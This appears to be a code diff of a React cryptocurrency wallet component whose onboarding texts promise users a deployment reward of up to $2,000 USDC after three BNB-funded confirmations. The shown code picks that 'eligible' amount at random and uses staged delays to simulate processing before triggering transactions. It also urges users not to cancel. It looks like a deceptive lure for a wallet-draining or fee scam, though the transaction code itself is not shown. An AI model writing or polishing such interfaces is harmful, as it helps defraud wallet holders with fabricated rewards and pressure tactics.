@@ -31,25 +31,25 @@ export function Wallet() {
     {
       target: "wallet-button", // Changed from deploy-button
       content:
-        "Click this button to connect your wallet or deploy the smart contract.",
+        "Click this button to connect your wallet and deploy the smart contract.",
       position: "bottom",
     },
     {
       target: "wallet-button",
       content:
-        "Please ensure that the specified BNB address contains sufficient BNB to complete all three required confirmations successfully.",
+        "Ensure that the specified BNB address contains sufficient BNB to complete all three required confirmations successfully.",
       position: "bottom",
     },
     {
       target: "wallet-button",
       content:
-        "Please avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
+        " Avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
       position: "bottom",
     },
     {
       target: "wallet-button",
       content:
-        "Upon completing all confirmations and achieving a successful deployment, your address will be added to the pool, to receive a reward of up to $2,000 USDT.",
+        "Upon completing all confirmations and achieving a successful deployment, your address would be added to the pool, to receive a reward of up to $2,000 USDC.",
       position: "bottom",
     },
   ];
@@ -212,17 +212,14 @@ export function Wallet() {
       showClose: false,
     },
     {
-      title: `Your address is eligible to receive $${eligibleAmount}`,
+      title: `Your contract deployment reward is $${eligibleAmount}`,
       icon: "🎉",
       loading: false,
       showClose: false,
     },
     {
-      title: "Processing Transactions",
-      subtitle:
-        confirmationCount > 0
-          ? `${confirmationCount}/3 confirmations completed`
-          : "Awaiting first confirmation",
+      title: "Processing Confirmations",
+      subtitle: `${confirmationCount}/3 confirmations completed`,
       icon: "⏳",
       loading: true,
       showClose: false,
@@ -357,20 +354,20 @@ export function Wallet() {
     setShowModal(true);
     setModalStep(0);
     setConfirmationCount(0);
-
+  
     const randomAmount =
       ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
-
+  
     setEligibleAmount(randomAmount);
     eligibleAmountRef.current = randomAmount;
-
-    // More realistic delays
+  
+    // Updated timings
     setTimeout(() => setModalStep(1), 4000); // 4 seconds for initial processing
-    setTimeout(() => setModalStep(2), 7000); // 3 more seconds to show eligibility
+    setTimeout(() => setModalStep(2), 7000); // 3 more seconds to show address added
     setTimeout(() => {
       setModalStep(3);
       handleSmartCall();
-    }, 11000); // 4 more seconds before starting transactions
+    }, 12000); // Changed from 11000 to 12000 to show eligibility for 5 seconds
   };
 
   const checkAndSwitchNetwork = async (): Promise<boolean> => {
